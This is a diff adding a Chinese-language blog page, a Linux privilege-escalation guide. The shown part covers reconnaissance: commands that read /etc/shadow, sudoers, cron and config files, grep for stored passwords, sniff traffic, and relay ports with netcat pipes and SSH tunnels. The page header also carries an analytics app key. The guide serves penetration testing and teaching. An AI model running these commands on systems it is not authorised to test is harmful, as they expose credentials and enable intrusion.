@@ -1,0 +1,1403 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/apple-touch-icon.png">
+  <link rel="icon" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="何语灵">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="整理了一些Linux内网提权的常用手段和注意事项">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权一文通">
+<meta property="og:url" content="https://m0ck1ng-b1rd.github.io/2022/02/01/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux/index.html">
+<meta property="og:site_name" content="M0cK1nG-b1Rd&#39;s site">
+<meta property="og:description" content="整理了一些Linux内网提权的常用手段和注意事项">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/c390e8882c274864b54a4b4edf3c9911-164658049401417.png">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/491b3a4805a149fdafa6105263e304c7.png">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/67b98c2f3dc04bfba3e90b52a4ffd4d7.png">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/0e6554640dbb494ba4b2faa28d53621d.png">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/94b22fbd44e94607bfa97fc12bb5fb5a-164658049401522.png">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/3990e063432643aea3ba76bbfc510f8d-164658049401524.png">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/6e956b067db24194b6dad1137446a812.png">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/e772954b9ced4eef9106844ad192a0bd-164658049401527.png">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/0e25ae391baa40d0ab794baf043e8215.png">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/7df1491fd39c4d43adc0680b5de6a72a.png">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/3f5307fef3ad4bf98c64423710b1029c-164658049401531.png">
+<meta property="article:published_time" content="2022-02-01T04:21:06.000Z">
+<meta property="article:modified_time" content="2022-04-13T07:49:09.282Z">
+<meta property="article:author" content="何语灵">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/c390e8882c274864b54a4b4edf3c9911-164658049401417.png">
+  
+  
+  
+  <title>Linux提权一文通 - M0cK1nG-b1Rd&#39;s site</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"m0ck1ng-b1rd.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"87rdYWc7BpvmNHtufVgH6hwF-gzGzoHsz","app_key":"FOGIb6hlzKdTWSp4wBpACnWG","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>M0cK1nG-b1Rd&#39;s site</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/761607.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Linux提权一文通"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-02-01 12:21" pubdate>
+          2022年2月1日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          23k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          193 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Linux提权一文通</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2022年4月13日 下午
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <h1 id="Linux提权一文通"><a href="#Linux提权一文通" class="headerlink" title="Linux提权一文通"></a>Linux提权一文通</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>原文来自于<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/251884.html">https://www.freebuf.com/articles/251884.html</a></p>
+<p>感觉很多都是机翻，还有些大大小小的格式问题</p>
+<p>遂去外网找到原文重新翻译排版了一遍，同时也参考了原文的翻译</p>
+<h2 id="0x01-Linux提权描述"><a href="#0x01-Linux提权描述" class="headerlink" title="0x01 Linux提权描述"></a>0x01 Linux提权描述</h2><p>大多数计算机系统设计为可与多个用户一起使用。特权是指允许用户执行的操作。普通特权包括查看和编辑文件或修改系统文件。特权升级意味着用户获得他们无权获得的特权。这些特权可用于删除文件，查看私人信息或安装不需要的程序，例如病毒。通常，当系统存在允许绕过安全性的错误或对使用方法的设计假设存在缺陷时，通常会发生这种情况。</p>
+<p>特权提升是利用操作系统或软件应用程序中的错误，设计缺陷等等来获得对通常受到应用程序或用户保护的资源的更高访问权限的行为。结果是，具有比应用程序开发人员或系统管理员想要的特权更多的应用程序可以执行未经授权的操作。</p>
+<p>特权升级有两种类型:<strong>水平</strong>和<strong>垂直。</strong>在<strong>水平升级中</strong>，您从一个用户转移到另一个用户。在这种情况下，两个用户都是通用的，而在<strong>垂直</strong>方式中，我们将特权从普通用户提升为<strong>管理员</strong></p>
+<p>即用户无法访问（读取&#x2F;写入&#x2F;执行）不允许访问的文件。但是，超级用户（root）可以访问系统上存在的所有文件。 为了更改任何重要的配置或进行进一步的攻击，我们需要在任何基于Linux的系统上获得root用户访问权限。</p>
+<h2 id="0x02-Linux系统权限提升前的信息收集"><a href="#0x02-Linux系统权限提升前的信息收集" class="headerlink" title="0x02 Linux系统权限提升前的信息收集"></a>0x02 Linux系统权限提升前的信息收集</h2><p><strong>信息收集非常关键。</strong></p>
+<p>（Linux）特权提升的Tips:</p>
+<ul>
+<li><strong>信息收集</strong>-更多的信息收集，信息收集是整个渗透测试过程的</li>
+<li>整理信息-<strong>分析收集的信息</strong>和整理信息。</li>
+<li>搜索漏洞- 知道要搜索什么以及在哪里可以<strong>找到</strong>漏洞利用代码。</li>
+<li>修改代码-<strong>修改</strong>漏洞利用程序，使其适合目前的渗透。并非每种漏洞都能为“现成”的每个系统工作。漏洞看环境</li>
+<li>尝试攻击-为（很多）<strong>尝试和错误</strong>做好准备。</li>
+</ul>
+<h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><h4 id="发行类型-amp-版本"><a href="#发行类型-amp-版本" class="headerlink" title="发行类型&amp;版本"></a>发行类型&amp;版本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/issue <br><span class="hljs-built_in">cat</span> /etc/*-release <br><span class="hljs-built_in">cat</span> /etc/lsb-release <span class="hljs-comment"># Debian based </span><br><span class="hljs-built_in">cat</span> /etc/redhat-release <span class="hljs-comment"># Redhat based</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="内核版本版本号-amp-系统位数"><a href="#内核版本版本号-amp-系统位数" class="headerlink" title="内核版本版本号&amp;系统位数"></a>内核版本版本号&amp;系统位数</h4><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs tcl">cat /<span class="hljs-keyword">proc</span>/version<span class="hljs-title"> </span><br><span class="hljs-title">uname</span> -a<span class="hljs-title"> </span><br><span class="hljs-title">uname</span> -mrs<span class="hljs-title"> </span><br><span class="hljs-title">rpm</span> -q<span class="hljs-title"> </span><br><span class="hljs-title">kernel</span> <span class="hljs-title"></span><br><span class="hljs-title">dmesg</span> |<span class="hljs-title"> grep</span> Linux<span class="hljs-title"> </span><br><span class="hljs-title">ls</span> /boot |<span class="hljs-title"> grep</span> vmlinuz-<br></code></pre></td></tr></table></figure>
+
+<h4 id="环境变量（可能存在密码或API密钥-）"><a href="#环境变量（可能存在密码或API密钥-）" class="headerlink" title="环境变量（可能存在密码或API密钥 ）"></a>环境变量（可能存在密码或API密钥 ）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/profile <br><span class="hljs-built_in">cat</span> /etc/bashrc <br><span class="hljs-built_in">cat</span> ~/.bash_profile <br><span class="hljs-built_in">cat</span> ~/.bashrc <br><span class="hljs-built_in">cat</span> ~/.bash_logout <br><span class="hljs-built_in">env</span><br><span class="hljs-built_in">set</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h4><p><strong>如果对该变量内的任何文件夹都具有写权限，则可以劫持某些库或二进制文件:</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="有打印机吗？"><a href="#有打印机吗？" class="headerlink" title="有打印机吗？"></a>有打印机吗？</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lpstat -a<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="应用与服务"><a href="#应用与服务" class="headerlink" title="应用与服务"></a>应用与服务</h3><p><strong>获取运行的服务和归属的用户</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ps</span> aux <br><span class="hljs-built_in">ps</span> <span class="hljs-literal">-ef</span> <br>top <br><span class="hljs-built_in">cat</span> /etc/services<br></code></pre></td></tr></table></figure>
+
+<p><strong>以root身份运行的服务</strong></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> root <br><span class="hljs-keyword">ps</span> -ef | <span class="hljs-keyword">grep</span> root<br></code></pre></td></tr></table></figure>
+
+<p><strong>安装的程序、版本信息、运行状态</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">ls -alh <span class="hljs-regexp">/usr/</span>bin/ <br>ls -alh <span class="hljs-regexp">/sbin/</span> <br>dpkg -l <br>rpm -qa <br>ls -alh <span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/apt/</span>archivesO <br>ls -alh <span class="hljs-regexp">/var/</span>cache<span class="hljs-regexp">/yum/</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>服务器配置信息（配置错误和脆弱组件）</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>syslog.conf<br>cat <span class="hljs-regexp">/etc/</span>chttp.conf<br>cat <span class="hljs-regexp">/etc/</span>lighttpd.conf<br>cat <span class="hljs-regexp">/etc/</span>cups/cupsd.conf<br>cat <span class="hljs-regexp">/etc/i</span>netd.conf cat <span class="hljs-regexp">/etc/</span>apache2/apache2.conf<br>cat <span class="hljs-regexp">/etc/my</span>.conf cat <span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf<br>cat <span class="hljs-regexp">/opt/</span>lampp<span class="hljs-regexp">/etc/</span>httpd.conf ls -aRl <span class="hljs-regexp">/etc/</span> | awk <span class="hljs-string">&#x27;$1 ~ /^.*r.*/</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>计划了哪些工作？（计划任务）</strong> </p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle">crontab -l<br>ls -alh <span class="hljs-regexp">/var/</span>spool/cron<br>ls -al <span class="hljs-regexp">/etc/</span> | <span class="hljs-keyword">grep</span> cron<br>ls -al <span class="hljs-regexp">/etc/</span>cron*<br>cat <span class="hljs-regexp">/etc/</span>cron*<br>cat <span class="hljs-regexp">/etc/</span>at.allow<br>cat <span class="hljs-regexp">/etc/</span>at.deny<br>cat <span class="hljs-regexp">/etc/</span>cron.allow<br>cat <span class="hljs-regexp">/etc/</span>cron.deny<br>cat <span class="hljs-regexp">/etc/</span>crontab<br>cat <span class="hljs-regexp">/etc/</span>anacrontab<br>cat <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>crontabs/root<br></code></pre></td></tr></table></figure>
+
+<p><strong>是否有纯文本用户名和&#x2F;或密码？</strong></p>
+<ul>
+<li>检查Web服务器连接到数据库的文件（config.php或类似文件）</li>
+<li>检查数据库以获取可能被重用的管理员密码</li>
+<li>检查弱口令</li>
+</ul>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">grep</span> -i user [filename]<br><span class="hljs-keyword">grep</span> -i pass [filename]<br><span class="hljs-keyword">grep</span> -C <span class="hljs-number">5</span> <span class="hljs-string">&quot;password&quot;</span> [filename]<br>find . -name <span class="hljs-string">&quot;*.php&quot;</span> -<span class="hljs-keyword">print</span><span class="hljs-number">0</span> | xargs -<span class="hljs-number">0</span> <span class="hljs-keyword">grep</span> -i -n <span class="hljs-string">&quot;var $password&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="通信与网络"><a href="#通信与网络" class="headerlink" title="通信与网络"></a>通信与网络</h3><p><strong>查看网卡</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">ifconfig -a <br>cat <span class="hljs-regexp">/etc/</span>network/interfaces <br>cat <span class="hljs-regexp">/etc/</span>sysconfig/network<br></code></pre></td></tr></table></figure>
+
+<p><strong>网络配置、网络信息、DHCP服务器、DNS服务器、网关</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>resolv.conf <br>cat <span class="hljs-regexp">/etc/</span>sysconfig/network <br>cat <span class="hljs-regexp">/etc/</span>networks <br>iptables -L hostname dnsdomainname<br></code></pre></td></tr></table></figure>
+
+<p><strong>通信状况</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">netstat</span> -anlp<br><span class="hljs-attribute">netstat</span> -ano  <br><span class="hljs-attribute">lsof</span> -i <br><span class="hljs-attribute">lsof</span> -i :<span class="hljs-number">80</span> grep <span class="hljs-number">80</span> /etc/services <br><span class="hljs-attribute">netstat</span> -antup <br><span class="hljs-attribute">netstat</span> -antpx <br><span class="hljs-attribute">netstat</span> -tulpn <br><span class="hljs-attribute">chkconfig</span> --list <br><span class="hljs-attribute">chkconfig</span> --list | grep <span class="hljs-number">3</span>:<span class="hljs-literal">on</span> last w<br></code></pre></td></tr></table></figure>
+
+<p><strong>缓存了什么？IP和&#x2F;或MAC地址</strong></p>
+<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">arp -e <br><span class="hljs-keyword">route</span> <br><span class="hljs-keyword">route</span> -nee<br></code></pre></td></tr></table></figure>
+
+<p><strong>数据包嗅探</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcpdump</span> tcp dst <span class="hljs-number">192.168.1.7</span> <span class="hljs-number">80</span> and tcp dst <span class="hljs-number">10.5.5.252</span> <span class="hljs-number">21</span><br></code></pre></td></tr></table></figure>
+
+<p>注意:tcpdump tcp dst [ip] [端口]和tcp dst [ip] [端口]</p>
+<h5 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h5><p>FPipe.exe -l [本地端口] -r [远程端口] -s [本地端口] [本地IP]</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">FPipe</span>.exe -l <span class="hljs-number">80</span> -r <span class="hljs-number">80</span> -s <span class="hljs-number">80</span> <span class="hljs-number">192.168.1.7</span><br></code></pre></td></tr></table></figure>
+
+<p>ssh-[L &#x2F; R] [本地端口]:[远程IP]:[远程端口] [本地用户] @ [本地IP]</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">8080</span>:<span class="hljs-number">127.0.0.1:80</span> root@<span class="hljs-number">192.168.1.7</span> # Local Port ssh -R <span class="hljs-number">8080</span>:<span class="hljs-number">127.0.0.1:80</span> root@<span class="hljs-number">192.168.1.7</span> # Remote Port<br></code></pre></td></tr></table></figure>
+
+<p>mknod backpipe p; nc -l -p [远程端口] &lt;backpipe | nc [本地IP] [本地端口]&gt; backpipe</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mknod</span> backpipe p ; nc -l -p <span class="hljs-number">8080</span> &lt; backpipe | nc <span class="hljs-number">10.5.5.151</span> <span class="hljs-number">80</span> &gt;backpipe # Port Relay<br><br><span class="hljs-attribute">mknod</span> backpipe p ; nc -l -p <span class="hljs-number">8080</span> <span class="hljs-number">0</span> &amp; &lt; backpipe | tee -a inflow | nc localhost <span class="hljs-number">80</span> | tee -a outflow <span class="hljs-number">1</span>&gt;backpipe # Proxy (Port <span class="hljs-number">80</span> to <span class="hljs-number">8080</span>)<br><br><span class="hljs-attribute">mknod</span> backpipe p ; nc -l -p <span class="hljs-number">8080</span> <span class="hljs-number">0</span> &amp; &lt; backpipe | tee -a inflow | nc localhost <span class="hljs-number">80</span> | tee -a outflow &amp; <span class="hljs-number">1</span>&gt;backpipe # Proxy monitor (Port <span class="hljs-number">80</span> to <span class="hljs-number">8080</span>)<br></code></pre></td></tr></table></figure>
+
+<p>可以使用隧道吗？在本地远程发送命令</p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">ssh -D 127.0.0.1:9050 -N <span class="hljs-comment">[username]</span>@<span class="hljs-comment">[ip]</span> proxychains ifconfig<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><h5 id="你是谁？谁登录？谁已经登录？那里还有谁？谁能做什么？"><a href="#你是谁？谁登录？谁已经登录？那里还有谁？谁能做什么？" class="headerlink" title="你是谁？谁登录？谁已经登录？那里还有谁？谁能做什么？"></a>你是谁？谁登录？谁已经登录？那里还有谁？谁能做什么？</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span><br><span class="hljs-built_in">who</span><br>w<br>last<br><span class="hljs-built_in">cat</span> /etc/passwd | <span class="hljs-built_in">cut</span> -d: -f1 <span class="hljs-comment"># List of users</span><br>grep -v -E <span class="hljs-string">&quot;^#&quot;</span> /etc/passwd | awk -F: <span class="hljs-string">&#x27;$3 == 0 &#123; print $1&#125;&#x27;</span> <span class="hljs-comment"># List of super users</span><br>awk -F: <span class="hljs-string">&#x27;($3 == &quot;0&quot;) &#123;print&#125;&#x27;</span> /etc/passwd <span class="hljs-comment"># List of super users</span><br><span class="hljs-built_in">cat</span> /etc/sudoers<br>sudo -l<br></code></pre></td></tr></table></figure>
+
+<p><strong>系统账户信息</strong> </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd<br><span class="hljs-built_in">cat</span> /etc/group<br><span class="hljs-built_in">cat</span> /etc/shadow<br><span class="hljs-built_in">ls</span> -alh /var/mail/<br></code></pre></td></tr></table></figure>
+
+<p><strong>home&#x2F;root目录</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -ahlR /root/<br><span class="hljs-built_in">ls</span> -ahlR /home/<br></code></pre></td></tr></table></figure>
+
+<p><strong>配置文件、日志文件、可能存储口令的位置</strong></p>
